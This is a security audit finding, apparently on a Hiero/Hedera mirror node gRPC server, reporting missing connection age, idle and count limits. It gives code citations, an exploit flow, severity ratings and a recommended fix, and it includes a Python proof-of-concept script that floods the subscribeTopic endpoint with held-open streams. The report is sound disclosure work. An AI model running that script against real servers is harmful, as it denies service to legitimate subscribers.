### Title
Unbounded Connection Accumulation via Missing `maxConnectionAge`/`maxConnectionIdle` in `grpcServerConfigurer()`

### Summary
`grpcServerConfigurer()` configures the Netty gRPC server with only a per-connection call limit (`maxConcurrentCallsPerConnection = 5`) but sets no `maxConnectionAge`, `maxConnectionIdle`, or total `maxConnections` bound. Any unauthenticated external client can open an unlimited number of long-lived TCP connections, each holding up to 5 active streaming calls indefinitely, exhausting file descriptors, heap memory, and the shared `applicationTaskExecutor` thread pool until the server can no longer accept new subscriptions.

### Finding Description
**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, `grpcServerConfigurer()`, lines 28–35:
```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection()); // = 5
    // NO maxConnectionAge, NO maxConnectionIdle, NO maxConnections
};
```

`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, lines 11–15:
```java
public class NettyProperties {
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
    // No other Netty server-side connection lifecycle fields
}
```

**Root cause:** The `NettyServerBuilder` API exposes `maxConnectionAge(long, TimeUnit)`, `maxConnectionAgeGrace(long, TimeUnit)`, `maxConnectionIdle(long, TimeUnit)`, and `maxConnections(int)`. None of these are called. The failed assumption is that `maxConcurrentCallsPerConnection` is sufficient to bound resource consumption — it only limits streams per connection, not the number of connections or their lifetime.

**Exploit flow:**
1. Attacker opens N TCP connections to port 5600 (or via the nginx proxy on 8080 — `grpc_read_timeout 600s` is set for `subscribeTopic`, giving a 10-minute window per stream).
2. On each connection, attacker issues 5 concurrent `subscribeTopic` streaming RPCs (the per-connection maximum), keeping them alive by never closing the stream.
3. Because there is no `maxConnectionIdle` or `maxConnectionAge`, these connections are never reaped by the server.
4. Each active streaming call holds state in the `applicationTaskExecutor` thread pool (used for reactive scheduling/emission) and consumes a Netty channel object, associated buffers, and a JVM file descriptor.
5. After enough connections accumulate, the server exhausts file descriptors (OS limit), heap memory, or executor queue capacity, causing `RESOURCE_EXHAUSTED` or connection refusal for all new legitimate subscribers.

**Why existing checks fail:**
- `maxConcurrentCallsPerConnection = 5` is a per-connection cap; it does not bound the total number of connections.
- The GCP backend policy `maxRatePerEndpoint: 250` limits new request rate, not the count of persistent open connections.
- The nginx `keepalive 16` is a proxy-side upstream pool setting, not a client-facing connection limit.
- No authentication or authorization is required on the gRPC endpoint (the only server interceptor, `GrpcInterceptor`, only sets an `EndpointContext` for table-usage tracking).

### Impact Explanation
An attacker can render the gRPC subscription service completely unavailable to legitimate clients. `subscribeTopic` is the primary mechanism for clients to receive consensus topic messages (gossip-adjacent subscriptions). Exhausting file descriptors or the executor thread pool causes all new `subscribeTopic` calls to fail with `RESOURCE_EXHAUSTED` or a TCP connection refusal, constituting a full denial-of-service against the subscription plane. Severity: **High** (availability impact on a public, unauthenticated endpoint with no authentication gate).

### Likelihood Explanation
Preconditions: network access to port 5600 or the nginx proxy — no credentials, no tokens, no privileged position required. The attack is trivially scriptable: a single machine can open thousands of TCP connections and issue gRPC streaming calls. The 600-second nginx `grpc_read_timeout` for `subscribeTopic` means each stream can be held open for up to 10 minutes before the proxy closes it, giving the attacker a large window. The attack is repeatable and can be sustained continuously. Likelihood: **High**.

### Recommendation
Add the following calls inside `grpcServerConfigurer()`:

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
    serverBuilder.maxConnectionAge(nettyProperties.getMaxConnectionAge().toSeconds(), TimeUnit.SECONDS);
    serverBuilder.maxConnectionAgeGrace(nettyProperties.getMaxConnectionAgeGrace().toSeconds(), TimeUnit.SECONDS);
    serverBuilder.maxConnectionIdle(nettyProperties.getMaxConnectionIdle().toSeconds(), TimeUnit.SECONDS);
    // Optionally: serverBuilder.maxConnections(nettyProperties.getMaxConnections());
};
```

Add corresponding fields to `NettyProperties` with safe defaults (e.g., `maxConnectionAge = 5m`, `maxConnectionAgeGrace = 30s`, `maxConnectionIdle = 5m`). This forces the server to periodically recycle connections and evict idle ones, bounding the total resource consumption regardless of attacker behavior.

### Proof of Concept
```python
import grpc
import threading
from concurrent.futures import ThreadPoolExecutor

# proto-generated stub for com.hedera.mirror.api.proto.ConsensusService
from hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2

TARGET = "mirror-node-grpc-host:5600"
NUM_CONNECTIONS = 500  # adjust to available FDs
STREAMS_PER_CONN = 5   # matches maxConcurrentCallsPerConnection default

def hold_connection(_):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    streams = []
    for _ in range(STREAMS_PER_CONN):
        req = consensus_service_pb2.ConsensusTopicQuery(topicID=...)
        # Start streaming call; iterator never consumed → stream held open
        streams.append(stub.subscribeTopic(req))
    # Block indefinitely, keeping connection and all streams alive
    threading.Event().wait()

with ThreadPoolExecutor(max_workers=NUM_CONNECTIONS) as pool:
    list(pool.map(hold_connection, range(NUM_CONNECTIONS)))

# After NUM_CONNECTIONS * STREAMS_PER_CONN active streams accumulate,
# new legitimate subscribeTopic calls receive RESOURCE_EXHAUSTED or connection refused.
``` [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-35)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L11-15)
```java
public class NettyProperties {

    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
}
```

**File:** docker-compose.yml (L225-227)
```yaml
        # Setting 600s read timeout for topic subscription. When the client receives a message the timeout resets to 0.
        location = /com.hedera.mirror.api.proto.ConsensusService/subscribeTopic { grpc_read_timeout 600s; grpc_pass grpc://grpc_host; }
        location /com.hedera.mirror.api.proto. { grpc_pass grpc://grpc_host; }
```
